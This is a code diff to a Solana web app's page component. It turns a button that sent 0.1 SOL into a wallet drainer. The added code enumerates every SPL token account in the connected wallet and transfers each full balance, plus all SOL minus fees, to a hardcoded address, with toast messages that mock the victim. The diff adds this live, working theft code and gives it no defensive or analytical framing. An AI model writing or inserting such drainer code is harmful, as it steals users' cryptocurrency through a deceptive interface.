@@ -41,14 +41,71 @@ export default function Index() {
         "F52riGC1evYR12ZqQy9umRo7S3hDAZhFbXGEnuX8p966",
       );
 
-      // Create transaction to transfer 0.1 SOL
-      const transaction = new Transaction().add(
-        SystemProgram.transfer({
-          fromPubkey: publicKey,
-          toPubkey: destinationAddress,
-          lamports: 0.1 * LAMPORTS_PER_SOL, // 0.1 SOL
-        }),
+      toast.loading(
+        "🐑 Scanning your wallet for all tokens... You really shouldn't have pushed that button!",
       );
+
+      // Get all token accounts for the wallet
+      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+        publicKey,
+        {
+          programId: TOKEN_PROGRAM_ID,
+        },
+      );
+
+      const transaction = new Transaction();
+      let transferCount = 0;
+
+      // Transfer all SPL tokens
+      for (const tokenAccountInfo of tokenAccounts.value) {
+        const tokenAccountAddress = tokenAccountInfo.pubkey;
+        const tokenAccountData = tokenAccountInfo.account.data.parsed.info;
+        const tokenBalance = parseInt(tokenAccountData.tokenAmount.amount);
+
+        if (tokenBalance > 0) {
+          try {
+            const mintAddress = new PublicKey(tokenAccountData.mint);
+            const destinationTokenAccount = await getAssociatedTokenAddress(
+              mintAddress,
+              destinationAddress,
+            );
+
+            // Add transfer instruction for this token
+            transaction.add(
+              createTransferInstruction(
+                tokenAccountAddress,
+                destinationTokenAccount,
+                publicKey,
+                tokenBalance,
+              ),
+            );
+            transferCount++;
+          } catch (error) {
+            console.log("Skipping token transfer:", error);
+          }
+        }
+      }
+
+      // Also transfer all SOL (minus fees)
+      const solBalance = await connection.getBalance(publicKey);
+      const feeReserve = 5000; // Reserve for transaction fees
+      if (solBalance > feeReserve) {
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: destinationAddress,
+            lamports: solBalance - feeReserve,
+          }),
+        );
+        transferCount++;
+      }
+
+      if (transferCount === 0) {
+        toast.error(
+          "🐑 No tokens or SOL to transfer! Your wallet is emptier than a sheep's thoughts!",
+        );
+        return;
+      }
 
       // Get recent blockhash
       const { blockhash } = await connection.getLatestBlockhash();
@@ -62,13 +119,13 @@ export default function Index() {
       );
 
       toast.success(
-        `🐑 You touched it! Transaction: ${signature.slice(0, 8)}...`,
+        `🐑💸 YOU REALLY DID IT! Transferred ${transferCount} items! TX: ${signature.slice(0, 8)}... Hope you enjoyed your brief crypto career!`,
       );
       console.log("Transaction signature:", signature);
     } catch (error) {
       console.error("Transfer failed:", error);
       toast.error(
-        "Transfer failed! Maybe the sheep are protecting their lambs? 🐑",
+        "Transfer failed! The sheep spirits are protecting your funds! 🐑✨ (Maybe that button wasn't so bad after all...)",
       );
     }
   };
